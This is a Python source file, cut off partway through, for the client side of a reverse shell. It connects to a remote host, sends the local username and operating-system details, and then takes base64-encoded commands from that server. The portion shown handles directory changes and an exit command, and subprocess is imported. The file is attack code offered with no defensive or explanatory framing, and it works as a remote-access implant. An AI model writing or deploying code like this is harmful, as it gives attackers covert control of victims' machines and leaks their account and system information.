import os
import socket
import subprocess
import platform
from time import sleep
import base64

def inbound(sock):
    """Receive and decode message from server."""
    try:
        message = sock.recv(1024).decode()
        message = base64.b64decode(message).decode().strip()
        return message
    except Exception as e:
        print(f"[-] Error receiving message: {e}")
        sock.close()
        return None

def outbound(sock, message):
    """Encode and send message to server."""
    try:
        response = base64.b64encode(message.encode('utf-8'))
        sock.send(response)
    except Exception as e:
        print(f"[-] Error sending message: {e}")
        sock.close()

def session_handler(host_ip, host_port):
    """Handle communication with the server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f'[+] Connecting to {host_ip}:{host_port}')
        sock.connect((host_ip, host_port))

        # Send login username
        outbound(sock, os.getlogin())
        sleep(1)

        # Send operating system information
        op_sys = platform.uname()
        op_sys_info = f'{op_sys.system} {op_sys.release}'
        outbound(sock, op_sys_info)

        while True:
            message = inbound(sock)
            if message is None:
                break

            if message == 'exit':
                print('[+] Connection closed by server')
                sock.close()
                break

            elif message.split(" ")[0] == 'cd':
                try:
                    directory = message.split(" ", 1)[1]
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(sock, cur_dir)
                except FileNotFoundError:
                    outbound(sock, '[-] Directory not found. Try again.')
                except IndexError:
                    outbound(sock, '[-] No
